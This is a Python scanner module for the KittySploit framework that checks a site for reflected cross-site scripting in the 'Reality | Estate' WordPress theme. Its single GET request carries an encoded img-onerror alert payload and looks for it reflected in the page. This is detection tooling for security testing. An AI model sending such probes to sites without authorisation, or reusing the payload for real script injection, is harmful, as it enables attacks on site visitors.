#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reflected XSS was discovered in the 'Reality | Estate Multipurpose WordPress Theme'."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Reality Estate Multipurpose WP-Theme < 2.5.3 - Cross-Site Scripting Detection',
        'description': "Reflected XSS was discovered in the 'Reality | Estate Multipurpose WordPress Theme'.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wpscan', 'xss', 'wordpress', 'wp', 'wp-theme', 'reality', 'estate', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/10064',
            'https://www.exploitalert.com/view-details.html?id=34777',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('reality', 'estate', '><img src=x onerror=(alert)(document.domain)',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Reality Estate Multipurpose WP-Theme < 2.5.3 - Cross-Site Scripting detected",
                path='/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22',
            )
            return True
        return False

